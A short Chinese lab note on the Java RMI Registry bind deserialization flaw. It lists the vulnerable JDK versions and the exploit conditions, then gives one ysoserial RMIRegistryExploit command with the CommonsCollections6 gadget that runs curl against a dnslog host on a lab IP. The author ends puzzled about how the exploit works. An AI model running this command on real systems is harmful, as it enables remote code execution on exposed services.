java-rmi-registry-bind-deserialization-bypass 代码执行

描述: Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1).

JDK版本限制 Java SE <= 6u131, <= 7u121, <= 8u112, Java SE Embedded <= 8u111, JRockit <= R28.3.12

上面这一条是漏洞刚爆出时的版本说明。由于漏洞修复方案不停地被绕过，直到8u241之前的所有版本，仍然可利用这个RMI Registry相关的漏洞。

漏洞利用条件

JDK <=8u112，可直接利用；8u112 < JDK < 8u241 利用方式需要反链恶意JRMP服务端，所以需要目标服务器能访问攻击者控制的服务器。

目标服务器引用了gadget所需要的第三方jar包

对于加载远程类(使用JNDI reference，结合RMI，LDAP实现；或者利用RMI的codebase特性)的问题尚未明确。留待后续文章中说明。



利用：kali执行命令，使用yso，自行修改IP和DNS地址

现在dnslog生成一个DNShttp://www.dnslog.cn/

```bash
java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.RMIRegistryExploit 192.168.1.192 1099 CommonsCollections6 "curl fpmprg.dnslog.cn"
```

![image-20211029210509330](C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211029210509330.png)

为啥这个exp要在靶机上执行yso？？？

java反序列化都是这样吗？   不应该是在我本地运行生成反序列化payload，然后post包上去？

如果我都能进入机器运行这个包了，那我还本地执行yso去干嘛？

